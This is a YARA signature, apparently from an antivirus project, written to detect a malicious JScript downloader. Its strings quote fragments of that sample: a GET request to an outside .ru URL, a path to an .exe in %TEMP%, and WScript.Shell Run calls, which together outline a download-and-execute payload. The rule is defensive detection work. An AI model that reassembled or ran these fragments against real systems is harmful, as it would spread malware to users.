rule sig_20160330_6b387ea670364a9aa74d64c4ce079391 {
  meta:
    description = "datamaliciousorder - file 20160330_6b387ea670364a9aa74d64c4ce079391.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "525096ea35aa8f71d7ac48549927e92b4b4b94d0c888f60bb36a3b0879bdb929"

  strings:
    $s1  = "function L(I, DH){V = V * 1; return I - DH;};" fullword ascii
    $s2  = "XW[Q](\"GET\", \"http://buketrose.ru/h3sia\", false);" fullword ascii
    $s3  = "if (XW[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function LW() {return UN[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KZEBvczV.ex\" + \"e\";};" fullword ascii
    $s5  = "var UN = function HQ0() {return WScript[M0](\"WScript\"+\".Shell\");}(), CA = 11;" fullword ascii
    $s6  = "function D(){return M2 + \"\";};" fullword ascii
    $s7  = "function OU() {return ((M3 == true) && (M3 == Y)) ? 1 : V;};" fullword ascii
    $s8  = "function A(X){UN[\"Run\"](X, V, V);};" fullword ascii
    $s9  = "function S()" fullword ascii
    $s10 = "function M(){return 22;};" fullword ascii
    $s11 = "function HE(){return M0;};" fullword ascii
    $s12 = "var EM = new this[\"Date\"]();" fullword ascii
    $s13 = "function HQ(OV) {var M1 = (1, 2, 3, 4, 5, OV); return M1;};" fullword ascii
    $s14 = "return L(AQ, QS);" fullword ascii
    $s15 = "}while (XG);" fullword ascii
    $s16 = "var R0 = false;" fullword ascii
    $s17 = "Y = true; " fullword ascii
    $s18 = "var Y = false;" fullword ascii
    $s19 = "var M3 = false;" fullword ascii
    $s20 = "M3 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}